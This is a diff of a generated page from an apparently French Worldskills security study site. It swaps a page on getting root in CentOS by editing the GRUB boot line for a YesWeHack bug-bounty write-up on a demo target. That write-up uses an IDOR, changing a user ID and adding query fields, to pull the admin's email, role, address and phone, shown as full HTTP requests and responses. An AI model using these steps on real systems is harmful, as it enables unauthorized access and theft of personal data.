@@ -9,7 +9,7 @@
   
   
   <link rel="shortcut icon" href="../../img/favicon.ico">
-  <title>Devenir root en utilisant le mono-utilisateur - CentOS - Worldskills - GJ enterprise</title>
+  <title>YesWeHAck - NeoDemoCorp reports - Worldskills - GJ enterprise</title>
   <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lato:400,700|Roboto+Slab:400,700|Inconsolata:400,700" />
 
   <link rel="stylesheet" href="../../css/theme.css" />
@@ -18,8 +18,8 @@
   
   <script>
     // Current page data
-    var mkdocs_page_name = "Devenir root en utilisant le mono-utilisateur - CentOS";
-    var mkdocs_page_input_path = "Pentest/mono_utilisateur_centos.md";
+    var mkdocs_page_name = "YesWeHAck - NeoDemoCorp reports";
+    var mkdocs_page_input_path = "yeswehack/neodemocorp.md";
     var mkdocs_page_url = null;
   </script>
   
@@ -89,16 +89,14 @@
                     </li>
                 </ul>
                 <p class="caption"><span class="caption-text">Pentest</span></p>
-                <ul class="current">
-                    <li class="toctree-l1 current"><a class="reference internal current" href="./">Devenir root en utilisant le mono-utilisateur - CentOS</a>
-    <ul class="current">
-    </ul>
+                <ul>
+                    <li class="toctree-l1"><a class="reference internal" href="../../Pentest/mono_utilisateur_centos/">Devenir root en utilisant le mono-utilisateur - CentOS</a>
                     </li>
                     <li class="toctree-l1"><a class="reference internal" href="#">CTF.live</a>
     <ul>
                 <li class="toctree-l2"><a class="reference internal" href="#">B.WebApps</a>
     <ul>
-                <li class="toctree-l3"><a class="reference internal" href="../CTF.live/B.WebApps/Ecommerce_Web_to_Shell/">Begginer WebApps - Ecommerce: Web to Shell</a>
+                <li class="toctree-l3"><a class="reference internal" href="../../Pentest/CTF.live/B.WebApps/Ecommerce_Web_to_Shell/">Begginer WebApps - Ecommerce: Web to Shell</a>
                 </li>
     </ul>
                 </li>
@@ -127,8 +125,10 @@
                     </li>
                 </ul>
                 <p class="caption"><span class="caption-text">Yeswehack</span></p>
-                <ul>
-                    <li class="toctree-l1"><a class="reference internal" href="../../yeswehack/neodemocorp/">YesWeHAck - NeoDemoCorp reports</a>
+                <ul class="current">
+                    <li class="toctree-l1 current"><a class="reference internal current" href="./">YesWeHAck - NeoDemoCorp reports</a>
+    <ul class="current">
+    </ul>
                     </li>
                 </ul>
       </div>
@@ -152,11 +152,11 @@
     
       
         
-          <li>Pentest &raquo;</li>
+          <li>Yeswehack &raquo;</li>
         
       
     
-    <li>Devenir root en utilisant le mono-utilisateur - CentOS</li>
+    <li>YesWeHAck - NeoDemoCorp reports</li>
     <li class="wy-breadcrumbs-aside">
       
     </li>
@@ -167,28 +167,61 @@
           <div role="main">
             <div class="section">
               
-                <h1 id="devenir-root-en-utilisant-le-mono-utilisateur-centos">Devenir root en utilisant le mono-utilisateur - CentOS</h1>
+                <h1 id="yeswehack-neodemocorp-reports">YesWeHAck - NeoDemoCorp reports</h1>
+<h1 id="idor">IDOR</h1>
 <ul>
-<li>
-<p>Se rendre dans le GRUB</p>
-</li>
-<li>
-<p>Lors du choix de BOOT, appuyer sur la touche <strong>e</strong>.</p>
-</li>
+<li>On login, there is a request to get user's informations : </li>
 </ul>
-<p><img alt="" src="../images/GRUB.png" /></p>
-<ul>
-<li>Remplacer <strong>ro</strong> dans la ligne <strong>init</strong> par <strong>rw init=/sysroot/bin/sh</strong></li>
-</ul>
-<p><img alt="" src="../images/grub_ro.png" /></p>
-<p><img alt="" src="../images/grub_rw.png" /></p>
-<ul>
-<li>Une fois root, executer : </li>
-</ul>
-<pre><code>chroot /sysroot
+<pre><code>GET /users/getinfo/1248/?fields[]=email&amp;fields[]=role HTTP/1.1
+Host: c5b5fc6e00b57e3da2da2e7a9c52dc17.bountystarter.com
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:81.0) Gecko/20100101 Firefox/81.0
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+X-Requested-With: XMLHttpRequest
+Connection: close
+Referer: https://c5b5fc6e00b57e3da2da2e7a9c52dc17.bountystarter.com/
+Cookie: csrfToken=XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX; CAKEPHP=XXXXXXXXXXXX
 </code></pre>
 
-<p><img alt="" src="../images/grub_root.png" /></p>
+<pre><code>{&quot;email&quot;:&quot;banane@patate.fr&quot;,&quot;role&quot;:&quot;user&quot;}
+</code></pre>
+
+<ul>
+<li>We can change user's ID 1248 =&gt; 1 to get admin's informations</li>
+</ul>
+<pre><code>GET /users/getinfo/1/?fields[]=email&amp;fields[]=role HTTP/1.1
+Host: c5b5fc6e00b57e3da2da2e7a9c52dc17.bountystarter.com
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:81.0) Gecko/20100101 Firefox/81.0
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+X-Requested-With: XMLHttpRequest
+Connection: close
+Referer: https://c5b5fc6e00b57e3da2da2e7a9c52dc17.bountystarter.com/
+Cookie: csrfToken=XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX; CAKEPHP=XXXXXXXXXXXX
+</code></pre>
+
+<pre><code>{&quot;email&quot;:&quot;joe@neodemo.corp&quot;,&quot;role&quot;:&quot;admin&quot;}
+</code></pre>
+
+<ul>
+<li>Then, we can add parameters to the request to get more inforamtions</li>
+</ul>
+<pre><code>GET /users/getinfo/1/?fields[]=email&amp;fields[]=role&amp;fields[]=address&amp;fields[]=zipcode&amp;fields[]=phone HTTP/1.1
+Host: c5b5fc6e00b57e3da2da2e7a9c52dc17.bountystarter.com
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:81.0) Gecko/20100101 Firefox/81.0
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+X-Requested-With: XMLHttpRequest
+Connection: close
+Referer: https://c5b5fc6e00b57e3da2da2e7a9c52dc17.bountystarter.com/
+Cookie: csrfToken=XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX; CAKEPHP=XXXXXXXXXXXX
+</code></pre>
+
+<pre><code>{&quot;email&quot;:&quot;joe@neodemo.corp&quot;,&quot;role&quot;:&quot;admin&quot;,&quot;address&quot;:&quot;2884 Elian Extension\nRolfsonfort, IN 38630-6178&quot;,&quot;zipcode&quot;:&quot;63883-16&quot;,&quot;phone&quot;:&quot;485.580.4012&quot;}
+</code></pre>
               
             </div>
           </div>
@@ -196,10 +229,8 @@
   
     <div class="rst-footer-buttons" role="navigation" aria-label="footer navigation">
       
-        <a href="../CTF.live/B.WebApps/Ecommerce_Web_to_Shell/" class="btn btn-neutral float-right" title="Begginer WebApps - Ecommerce: Web to Shell">Next <span class="icon icon-circle-arrow-right"></span></a>
       
-      
-        <a href="../../Exercices_finale/exercice_1/" class="btn btn-neutral" title="EXERCICE 1 – HARDENING LINUX - REMOTE LOGGING"><span class="icon icon-circle-arrow-left"></span> Previous</a>
+        <a href="../../security_onion/Installler_security_onion/" class="btn btn-neutral" title="Installler security onion"><span class="icon icon-circle-arrow-left"></span> Previous</a>
       
     </div>
   
@@ -225,10 +256,8 @@
     <span class="rst-current-version" data-toggle="rst-current-version">
       
       
-        <span><a href="../../Exercices_finale/exercice_1/" style="color: #fcfcfc;">&laquo; Previous</a></span>
+        <span><a href="../../security_onion/Installler_security_onion/" style="color: #fcfcfc;">&laquo; Previous</a></span>
       
-      
-        <span style="margin-left: 15px"><a href="../CTF.live/B.WebApps/Ecommerce_Web_to_Shell/" style="color: #fcfcfc">Next &raquo;</a></span>
       
     </span>
 </div>
